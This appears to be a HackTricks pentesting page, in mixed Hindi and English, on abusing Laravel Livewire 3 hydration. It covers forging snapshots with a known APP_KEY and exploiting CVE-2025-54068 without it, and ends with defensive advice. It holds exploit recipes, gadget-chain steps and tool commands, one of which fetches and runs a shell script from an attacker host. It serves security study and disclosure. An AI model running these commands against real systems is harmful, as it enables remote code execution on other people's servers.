# Laravel Livewire Hydration & Synthesizer Abuse

{{#include ../../banners/hacktricks-training.md}}

## Livewire state machine का पुनरावलोकन

Livewire 3 components अपने state को **snapshots** के माध्यम से आदान-प्रदान करते हैं, जो `data`, `memo`, और एक checksum रखते हैं। `/livewire/update` पर हर POST सर्वर-साइड पर JSON snapshot को पुनरुज्जीवित (rehydrate) करता है और कतारबद्ध `calls`/`updates` को निष्पादित करता है।
```php
class Checksum {
static function verify($snapshot) {
$checksum = $snapshot['checksum'];
unset($snapshot['checksum']);
if ($checksum !== self::generate($snapshot)) {
throw new CorruptComponentPayloadException;
}
}

static function generate($snapshot) {
return hash_hmac('sha256', json_encode($snapshot), $hashKey);
}
}
```
जिसके पास `APP_KEY` है (जो `$hashKey` निकालने के लिए इस्तेमाल होता है), वह HMAC को पुनः गणना करके मनमाने snapshots फोर्ज कर सकता है।

जटिल properties को **synthetic tuples** के रूप में एन्कोड किया जाता है, जिन्हें `Livewire\Drawer\BaseUtils::isSyntheticTuple()` द्वारा पहचाना जाता है; प्रत्येक tuple `[value, {"s":"<key>", ...meta}]` होता है। Hydration core सरलता से प्रत्येक tuple को `HandleComponents::$propertySynthesizers` में चयनित synth को सौंप देता है और बच्चों पर recursion करता है:
```php
protected function hydrate($valueOrTuple, $context, $path)
{
if (! Utils::isSyntheticTuple($value = $tuple = $valueOrTuple)) return $value;
[$value, $meta] = $tuple;
$synth = $this->propertySynth($meta['s'], $context, $path);
return $synth->hydrate($value, $meta, fn ($name, $child)
=> $this->hydrate($child, $context, "{$path}.{$name}"));
}
```
यह recursive डिज़ाइन Livewire को एक सामान्य ऑब्जेक्ट-इंस्टांशिएशन इंजन बना देता है जब attacker ट्यूपल metadata या recursion के दौरान प्रोसेस किए गए किसी भी nested tuple को नियंत्रित कर ले।

## Synthesizers जो gadget primitives प्रदान करते हैं

| Synthesizer | Attacker-controlled behaviour |
|-------------|--------------------------------|
| **CollectionSynth (`clctn`)** | हर child को रीहाइड्रेट करने के बाद `new $meta['class']($value)` instantiate करता है। किसी भी class जिसका constructor array लेता है बनाया जा सकता है, और हर item स्वयं एक synthetic tuple भी हो सकता है. |
| **FormObjectSynth (`form`)** | `new $meta['class']($component, $path)` कॉल करता है, फिर attacker-controlled children से `$hydrateChild` के माध्यम से हर public property assign करता है। दो loosely typed parameters (या default args) स्वीकार करने वाले constructors भी arbitrary public properties तक पहुँचने के लिए पर्याप्त हैं. |
| **ModelSynth (`mdl`)** | जब meta में `key` अनुपस्थित होता है तो यह `return new $class;` execute करता है, जिससे attacker-control वाली किसी भी class का zero-argument instantiation संभव होता है. |

क्योंकि synths प्रत्येक nested element पर `$hydrateChild` कॉल करते हैं, tuples को recursive तरीके से स्टैक करके arbitrary gadget graphs बनाए जा सकते हैं।

## जब `APP_KEY` ज्ञात हो तो snapshots को जाली बनाना

1. एक वैध `/livewire/update` request कैप्चर करें और `components[0].snapshot` decode करें।
2. nested tuples inject करें जो gadget classes की ओर इशारा करते हों और फिर `checksum = hash_hmac('sha256', json_encode(snapshot_without_checksum), APP_KEY)` पुनः गणना करें।
3. snapshot को पुनः encode करें, `_token`/`memo` को बिना छुए रखें, और request replay करें।

एक न्यूनतम proof of execution **Guzzle's `FnStream`** और **Flysystem's `ShardedPrefixPublicUrlGenerator`** का उपयोग करता है। एक tuple `FnStream` को constructor data `{ "__toString": "phpinfo" }` के साथ instantiate करता है, अगला `ShardedPrefixPublicUrlGenerator` को `[FnStreamInstance]` को `$prefixes` के रूप में instantiate करता है। जब Flysystem प्रत्येक prefix को `string` में cast करता है, PHP attacker-प्रदान `__toString` callable को invoke करता है, जो बिना arguments किसी भी function को कॉल कर देता है।

### फ़ंक्शन कॉल से पूरा RCE

Livewire के instantiation primitives का उपयोग करते हुए, Synacktiv ने phpggc के `Laravel/RCE4` chain को अनुकूलित किया ताकि hydration एक ऐसे object को बूट करे जिसकी public Queueable state deserialization को trigger करे:

1. **Queueable trait** – कोई भी object जो `Illuminate\Bus\Queueable` का उपयोग करता है, public `$chained` expose करता है और `dispatchNextJobInChain()` में `unserialize(array_shift($this->chained))` execute करता है।
2. **BroadcastEvent wrapper** – `Illuminate\Broadcasting\BroadcastEvent` (ShouldQueue) को `CollectionSynth` / `FormObjectSynth` के माध्यम से instantiate किया जाता है और इसका public `$chained` populated होता है।
3. **phpggc Laravel/RCE4Adapted** – `$chained[0]` में संग्रहीत serialized blob `PendingBroadcast -> Validator -> SerializableClosure\Serializers\Signed` बनाता है। `Signed::__invoke()` अंततः `call_user_func_array($closure, $args)` को कॉल करता है जिससे `system($cmd)` सक्षम होता है।
4. **Stealth termination** – दूसरा `FnStream` callable जैसे `[new Laravel\Prompts\Terminal(), 'exit']` देने पर request `exit()` के साथ समाप्त हो जाता है बजाय किसी noisy exception के, जिससे HTTP response साफ़ रहता है।

### snapshot forgery का ऑटोमेशन

`synacktiv/laravel-crypto-killer` अब एक `livewire` mode के साथ आता है जो सब कुछ जोड़कर मिलाता है:
```bash
./laravel_crypto_killer.py exploit -e livewire -k base64:APP_KEY \
-j request.json --function system -p "bash -c 'id'"
```
टूल कैप्चर किए गए स्नैपशॉट को पार्स करता है, gadget tuples इंजेक्ट करता है, checksum को पुनः गणना करता है, और एक भेजने के लिए तैयार `/livewire/update` payload प्रिंट करता है।

## CVE-2025-54068 – RCE `APP_KEY` के बिना

वेंडर एडवाइजरी के अनुसार, यह समस्या Livewire v3 (>= 3.0.0-beta.1 और < 3.6.3) को प्रभावित करती है और यह केवल v3 के लिए विशिष्ट है।

`updates` component state में snapshot checksum वैलिडेट होने के **के बाद** मर्ज होते हैं। अगर snapshot के अंदर कोई property synthetic tuple है (या बन जाती है), तो Livewire हमलावर-नियंत्रित update मान को हाइड्रेट करते हुए उसके meta का पुनः उपयोग करता है:
```php
protected function hydrateForUpdate($raw, $path, $value, $context)
{
$meta = $this->getMetaForPath($raw, $path);
if ($meta) {
return $this->hydrate([$value, $meta], $context, $path);
}
}
```
Exploit recipe:

1. Find a Livewire component with an untyped public property (e.g., `public $count;`).
2. Send an update that sets that property to `[]`. The next snapshot now stores it as `[[], {"s": "arr"}]`.

A minimal type-juggling flow looks like this:

```http
POST /livewire/update
...
"updates": {"count": []}
```

Then the next snapshot stores a tuple that keeps the `arr` synthesizer metadata:

```json
"count": [[], {"s": "arr"}]
```

3. Craft another `updates` payload where that property contains a deeply nested array embedding tuples such as `[ <payload>, {"s":"clctn","class":"GuzzleHttp\\Psr7\\FnStream"} ]`.
4. During recursion, `hydrate()` evaluates each nested child independently, so attacker-chosen synth keys/classes are honoured even though the outer tuple and checksum never changed.
5. Reuse the same `CollectionSynth`/`FormObjectSynth` primitives to instantiate a Queueable gadget whose `$chained[0]` contains the phpggc payload. Livewire processes the forged updates, invokes `dispatchNextJobInChain()`, and reaches `system(<cmd>)` without knowing `APP_KEY`.

Key reasons this works:

- `updates` are not covered by the snapshot checksum.
- `getMetaForPath()` trusts whichever synth metadata already existed for that property even if the attacker previously forced it to become a tuple via weak typing.
- Recursion plus weak typing lets each nested array be interpreted as a brand new tuple, so arbitrary synth keys and arbitrary classes eventually reach hydration.

## Livepyre – end-to-end exploitation

[Livepyre](https://github.com/synacktiv/Livepyre) ऑटोमेट करता है APP_KEY-मुक्त CVE और signed-snapshot path—दोनों को:

- फिंगरप्रिन्ट करता है तैनात हुआ Livewire वर्शन `<script src="/livewire/livewire.js?id=HASH">` पार्स करके और उस hash को vulnerable releases से मैप करके।
- संग्रह करता है baseline snapshots को benign actions को रिप्ले करके और `components[].snapshot` को एक्स्ट्रैक्ट करके।
- जेनरेट करता है या तो एक `updates`-only payload (CVE-2025-54068) या एक forged snapshot (known APP_KEY) जिसमें phpggc chain एम्बेड होती है।
- अगर किसी snapshot में कोई object-typed parameter नहीं मिलता, तो Livepyre ब्रूट-फोर्स करके candidate params पर fallback करता है ताकि एक coercible property तक पहुँचा जा सके।

Typical usage:
```bash
# CVE-2025-54068, unauthenticated
python3 Livepyre.py -u https://target/livewire/component -f system -p id

# Signed snapshot exploit with known APP_KEY
python3 Livepyre.py -u https://target/livewire/component -a base64:APP_KEY \
-f system -p "bash -c 'curl attacker/shell.sh|sh'"
```
`-c/--check` एक non-destructive probe चलाता है, `-F` version gating को स्किप करता है, `-H` और `-P` कस्टम headers या proxies जोड़ते हैं, और `--function/--param` gadget chain द्वारा invoke की जाने वाली php function को अनुकूलित करते हैं।

## रक्षा संबंधी विचार

- Livewire के fixed builds (>= 3.6.4 के अनुसार vendor bulletin) पर अपग्रेड करें और CVE-2025-54068 के लिए vendor patch लागू करें।
- Livewire components में weakly-typed public properties से बचें; explicit scalar types property values को arrays/tuples में coerced होने से रोकते हैं।
- केवल वही synthesizers रजिस्टर करें जो वाकई ज़रूरी हैं और user-controlled metadata (`$meta['class']`) को untrusted मानें।
- ऐसी updates को reject करें जो किसी property का JSON type बदलती हैं (e.g., scalar -> array) जब तक कि स्पष्ट रूप से allow न किया गया हो, और stale tuples को reuse करने के बजाय synth metadata को पुनः derive करें।
- किसी भी disclosure के बाद तुरंत `APP_KEY` को rotate करें क्योंकि यह offline snapshot forging को सक्षम करता है चाहे code-base कितना भी patched क्यों न हो।

## References

- [Synacktiv – Livewire: Remote Command Execution via Unmarshaling](https://www.synacktiv.com/publications/livewire-execution-de-commandes-a-distance-via-unmarshaling.html)
- [synacktiv/laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer)
- [synacktiv/Livepyre](https://github.com/synacktiv/Livepyre)
- [GHSA-29cq-5w36-x7w3 – Livewire v3 RCE advisory](https://github.com/livewire/livewire/security/advisories/GHSA-29cq-5w36-x7w3)

{{#include ../../banners/hacktricks-training.md}}
